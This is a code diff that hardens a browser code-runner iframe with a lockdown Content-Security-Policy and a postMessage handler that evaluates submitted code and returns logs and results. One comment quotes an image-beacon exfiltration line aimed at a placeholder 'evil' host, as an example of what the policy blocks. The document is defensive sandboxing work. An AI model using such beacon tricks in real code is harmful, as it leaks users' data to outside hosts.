@@ -3,8 +3,110 @@
   <head>
     <meta charset="utf-8" />
     <title>runner sandbox</title>
+    <!--
+      Capability lockdown for the iframe.
+
+      The iframe is already isolated via `sandbox="allow-scripts"` (no
+      allow-same-origin → opaque origin → no DOM/cookie/storage access to the
+      host page). This CSP narrows what the user's code can *reach out to*:
+      no network (connect-src 'none' blocks fetch / XHR / WebSocket / Beacon),
+      no images (blocks `new Image().src = "//evil/?data=…"` exfiltration),
+      no media, fonts, or frames. Script is inline so `script-src` doesn't
+      need to match the (opaque-origin) iframe's URL — nothing is loaded
+      over the network.
+    -->
+    <meta
+      http-equiv="Content-Security-Policy"
+      content="default-src 'none'; script-src 'unsafe-inline' 'unsafe-eval'; connect-src 'none'; img-src 'none'; media-src 'none'; font-src 'none'; style-src 'none'; frame-src 'none'; object-src 'none'; form-action 'none'; base-uri 'none'"
+    />
   </head>
   <body>
-    <script src="/runner-sandbox.js"></script>
+    <script>
+      // Receives a payload of code from the parent over postMessage, runs it,
+      // and posts the result back.
+      (function () {
+        function origin(v) {
+          try {
+            if (v === undefined) return "undefined";
+            if (typeof v === "string") return v;
+            if (typeof v === "function")
+              return "[Function " + (v.name || "") + "]";
+            return JSON.stringify(v);
+          } catch (_e) {
+            return String(v);
+          }
+        }
+        var logs = [];
+        function pushLog(kind) {
+          return function () {
+            var parts = [];
+            for (var i = 0; i < arguments.length; i++)
+              parts.push(origin(arguments[i]));
+            logs.push(kind + " " + parts.join(" "));
+          };
+        }
+        console.log = pushLog("log");
+        console.info = pushLog("log");
+        console.warn = pushLog("warn");
+        console.error = pushLog("err");
+
+        // Reject anything that didn't come from our parent. With `sandbox`
+        // (no allow-same-origin) ev.origin is "null" for any sender, so the
+        // useful test is `ev.source === parent`.
+        window.addEventListener("message", function (ev) {
+          if (ev.source !== parent) return;
+          var data = ev.data || {};
+          if (!data.__runner) return;
+          var token = data.__runner;
+          var code = data.code;
+          logs = [];
+          (async function () {
+            try {
+              var fn = new Function(
+                "return (async () => { var __result, __vars; " +
+                  code +
+                  "\nreturn { __result: __result, __vars: __vars };" +
+                  " })();",
+              );
+              var ret = await fn();
+              var serializedVars;
+              if (ret.__vars && typeof ret.__vars === "object") {
+                serializedVars = {};
+                for (var k in ret.__vars) {
+                  if (Object.prototype.hasOwnProperty.call(ret.__vars, k)) {
+                    serializedVars[k] = origin(ret.__vars[k]);
+                  }
+                }
+              }
+              parent.postMessage(
+                {
+                  __runner: token,
+                  ok: true,
+                  logs: logs,
+                  result:
+                    ret.__result === undefined
+                      ? undefined
+                      : origin(ret.__result),
+                  vars: serializedVars,
+                },
+                "*",
+              );
+            } catch (e) {
+              parent.postMessage(
+                {
+                  __runner: token,
+                  ok: false,
+                  logs: logs,
+                  error: e && e.stack ? e.stack : String(e),
+                },
+                "*",
+              );
+            }
+          })();
+        });
+
+        parent.postMessage({ __runner: "ready" }, "*");
+      })();
+    </script>
   </body>
 </html>
